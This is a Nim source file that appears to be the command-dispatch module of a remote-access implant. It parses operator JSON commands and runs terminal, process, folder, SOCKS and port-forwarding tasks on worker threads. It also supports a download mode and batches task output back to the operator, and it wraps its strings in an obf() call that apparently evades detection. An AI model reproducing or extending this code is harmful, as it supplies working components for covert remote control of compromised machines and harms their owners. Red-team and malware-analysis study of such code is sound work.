import std/[json, strutils]
import ../global
import ./buffer
import ../linapi/handlers
import ./tasks
import ./threads
import ../../capabilities/modes
import ../../capabilities/filesystem

# ===============================================

var outSnap*: seq[uint32]

# ===============================================

proc function_of_thread(param: pointer): pointer {.noconv.} =
  # Runs one task on a worker thread and stores the result
  let wid = cast[ptr uint32](param)[]
  dealloc(param)
  defer:
    dec bgWorkers
    discard delete_thread(wid)
  let (_, tr) = read_thread(wid)
  var live = tr
  live.handle = cast[pointer](currentPthread())
  live.alive = true
  discard update_thread(wid, live)
  var got = read_task(tr.taskId, takeInput = true)
  if not got[0] or not got[1].running:
    return nil
  var work = move(got[1])
  var code = -1
  var raw = ""
  let (bufLen, bufOk) = calculateBufferSize(0, work)
  if not bufOk:
    var over = work
    over.running = false
    over.done = true
    over.result = create_json(work, obf("Output is too big (>=32 MB)"), true)
    over.pendingOut = over.result.len > 0
    discard update_task(tr.taskId, over)
    return nil
  var buf = newSeq[char](bufLen)
  let n = run(
    work.cmdType, work.mode, work.raw, work.args, work.input, work.params, work.host,
    work.tag, buf)
  if n < 0:
    code = -1
  elif n == 0:
    code = 0
  else:
    let (_, rawOk) = calculateBufferSize(n, tasks.TaskRecord())
    if not rawOk:
      raw = obf("Output is too big (>=32 MB)")
      code = 0
    else:
      raw = newString(n)
      copyMem(addr raw[0], addr buf[0], n)
      code = 0
  buf.setLen(0)
  work.input = ""
  var done = work
  done.running = false
  done.done = true
  # ===== download mode =====
  if work.mode == obf("download") and n == 0:
    done.result = ""
    done.pendingOut = false
  # =========================
  else:
    done.result = create_json(work, raw, code < 0)
    done.pendingOut = done.result.len > 0
  discard update_task(tr.taskId, done)
  nil

proc hexNib(c: char): int =
  # Converts one hex character into its numeric value
  case c
  of '0'..'9': ord(c) - ord('0')
  of 'a'..'f': ord(c) - ord('a') + 10
  of 'A'..'F': ord(c) - ord('A') + 10
  else: -1

proc putUtf8(dst: var string; at: var int; cp: int) =
  # Writes a unicode code point into the string as utf8 bytes
  if cp < 0x80:
    dst[at] = char(cp)
    inc at
  elif cp < 0x800:
    dst[at] = char(0xC0 or (cp shr 6))
    dst[at + 1] = char(0x80 or (cp and 0x3F))
    at += 2
  elif cp < 0x10000:
    dst[at] = char(0xE0 or (cp shr 12))
    dst[at + 1] = char(0x80 or ((cp shr 6) and 0x3F))
    dst[at + 2] = char(0x80 or (cp and 0x3F))
    at += 3
  else:
    dst[at] = char(0xF0 or (cp shr 18))
    dst[at + 1] = char(0x80 or ((cp shr 12) and 0x3F))
    dst[at + 2] = char(0x80 or ((cp shr 6) and 0x3F))
    dst[at + 3] = char(0x80 or (cp and 0x3F))
    at += 4

proc liftInputString(body: var string): string =
  # Pulls a large input string out of the json body in one allocation
  ## Pulls a large "input" string out in one allocation. parseJson grows that
  ## string one byte at a time and keeps every previous buffer.
  const minLift = 1024 * 1024
  let key = "\"" & obf("input") & "\""
  var search = 0
  var bestOpen = -1
  var bestClose = -1
  var bestSpan = 0
  while search < body.len:
    let k = body.find(key, search)
    if k < 0:
      break
    var i = k + key.len
    while i < body.len and body[i] in {' ', '\t', '\n', '\r'}:
      inc i
    if i >= body.len or body[i] != ':':
      search = k + 1
      continue
    inc i
    while i < body.len and body[i] in {' ', '\t', '\n', '\r'}:
      inc i
    if i >= body.len or body[i] != '"':
      search = k + 1
      continue
    let openQ = i
    var j = i + 1
    while j < body.len:
      if body[j] == '\\':
        if j + 1 >= body.len:
          break
        if body[j + 1] == 'u':
          j += 6
        else:
          j += 2
      elif body[j] == '"':
        break
      else:
        inc j
    if j >= body.len or body[j] != '"':
      search = k + 1
      continue
    let span = j - (openQ + 1)
    if span > bestSpan:
      bestSpan = span
      bestOpen = openQ
      bestClose = j
    search = j + 1
  if bestOpen < 0 or bestSpan < minLift:
    return ""
  let rawFrom = bestOpen + 1
  result = newString(bestSpan)
  var w = 0
  var j = rawFrom
  while j < bestClose:
    if body[j] == '\\' and j + 1 < bestClose:
      let n = body[j + 1]
      case n
      of '"', '\\', '/', '\'':
        result[w] = n
        inc w
        j += 2
      of 'b':
        result[w] = '\b'
        inc w
        j += 2
      of 'f':
        result[w] = '\f'
        inc w
        j += 2
      of 'n':
        result[w] = '\n'
        inc w
        j += 2
      of 'r':
        result[w] = '\r'
        inc w
        j += 2
      of 't':
        result[w] = '\t'
        inc w
        j += 2
      of 'u':
        if j + 5 >= bestClose:
          break
        var cp = 0
        var okh = true
        for h in 0 .. 3:
          let v = hexNib(body[j + 2 + h])
          if v < 0:
            okh = false
            break
          cp = (cp shl 4) or v
        if not okh:
          break
        j += 6
        if (cp and 0xFC00) == 0xD800 and j + 5 < bestClose and
            body[j] == '\\' and body[j + 1] == 'u':
          var cp2 = 0
          var ok2 = true
          for h in 0 .. 3:
            let v = hexNib(body[j + 2 + h])
            if v < 0:
              ok2 = false
              break
            cp2 = (cp2 shl 4) or v
          if ok2 and (cp2 and 0xFC00) == 0xDC00:
            cp = 0x10000 + (((cp - 0xD800) shl 10) or (cp2 - 0xDC00))
            j += 6
        putUtf8(result, w, cp)
      else:
        result[w] = n
        inc w
        j += 2
    else:
      result[w] = body[j]
      inc w
      inc j
  if w != result.len:
    result.setLen(w)
  let head = body[0 ..< bestOpen]
  let tail = body[bestClose + 1 .. ^1]
  body = head & "\"\"" & tail

proc run_command*(payload: sink string) =
  # Main function that parses commands and starts a worker for each one
  var body = payload
  if body.len == 0:
    return
  let (_, bodyOk) = calculateBufferSize(body.len, TaskRecord())
  if not bodyOk:
    return
  try:
    var lifted = ""
    if body.len >= 1024 * 1024:
      lifted = liftInputString(body)
    let root = parseJson(move(body))
    if root.kind != JObject or not root.hasKey(obf("commands")):
      return
    for cmd in root[obf("commands")]:
      if cmd.kind != JObject:
        continue
      if not cmd.hasKey(obf("type")) or not cmd.hasKey(obf("task_tag")):
        continue
      let cmdType = cmd[obf("type")].getStr()
      let tag = cmd[obf("task_tag")].getStr()
      if tag.len == 0:
        continue
      var inputField = ""
      let jsonInputEmpty =
        not cmd.hasKey(obf("input")) or cmd[obf("input")].kind != JString or
        cmd[obf("input")].str.len == 0
      if lifted.len > 0 and jsonInputEmpty:
        inputField = move(lifted)
      elif cmd.hasKey(obf("input")):
        var inputNode = cmd[obf("input")]
        if inputNode.kind == JString:
          inputField = move(inputNode.str)
        else:
          inputField = inputNode.getStr()
      let (_, inputOk) = calculateBufferSize(inputField.len, TaskRecord())
      if not inputOk:
        continue
      if cmdType notin [
        obf("terminal"), obf("folders"), obf("process"),
        obf("socks"), obf("port_forwarding"),
      ]:
        continue
      var rec = TaskRecord(
        tag: tag,
        cmdType: cmdType,
        host: if cmd.hasKey(obf("host")): cmd[obf("host")].getStr() else: hostTag,
        input: inputField,
        params: if cmd.hasKey(obf("parameters")): $(cmd[obf("parameters")]) else: obf("{}"),
        name: cmdType,
      )
      if cmdType == obf("terminal"):
        try:
          let p = parseJson(rec.params)
          if p.hasKey(obf("mode")):
            rec.mode = p[obf("mode")].getStr()
            rec.name = rec.mode
            rec.raw = rec.mode
          if p.hasKey(obf("args")):
            rec.args = p[obf("args")].getStr()
          if p.hasKey(obf("raw")):
            rec.raw = p[obf("raw")].getStr()
        except JsonParsingError:
          discard
      elif rec.input.len > 0:
        rec.name = rec.input
      rec.running = true
      let threadName = rec.name
      let mode = rec.mode
      let params = rec.params
      let id = create_task(move(rec))
      var wid = create_thread(ThreadRecord(taskId: id, name: threadName, alive: true))
      if mode == obf("download"):
        let dlTag = filesystem.paramValue(params, obf("download_id"), [obf("--download-id")])
        if dlTag.len > 0:
          let (trOk, trRec) = read_thread(wid)
          if trOk:
            var tagged = trRec
            tagged.tag = dlTag
            discard update_thread(wid, tagged)
      let heap = cast[ptr uint32](alloc0(sizeof(uint32)))
      heap[] = wid
      inc bgWorkers
      var tid: Pthread
      if not spawnPthread(tid, function_of_thread, cast[pointer](heap)):
        dec bgWorkers
        dealloc(heap)
        discard delete_thread(wid)
        let (storedOk, stored) = read_task(id)
        if storedOk:
          var stopped = stored
          stopped.running = false
          discard update_task(id, move(stopped))
  except JsonParsingError:
    discard

proc clear_tasks*(sentOk: bool; sentBody: string) =
  # Deletes sent tasks after the output was delivered
  if not sentOk:
    return
  for id in outSnap:
    discard delete_task(id)
  outSnap.setLen(0)

proc check_output*(): bool =
  # Checks that any task still has pending output
  let order = taskOrder
  for id in order:
    let (ok, t) = read_task(id)
    if ok and t.pendingOut:
      return true
  false

proc get_output*(): string =
  # Builds the output batch from tasks with pending results
  var parts: seq[string] = @[]
  outSnap = @[]
  let order = taskOrder
  for id in order:
    let (ok, t) = read_task(id)
    if ok and t.pendingOut and t.result.len > 0:
      parts.add t.result
      outSnap.add id
  let batch =
    if parts.len == 0: obf("[]") else: "[" & parts.join(",") & "]"
  batch
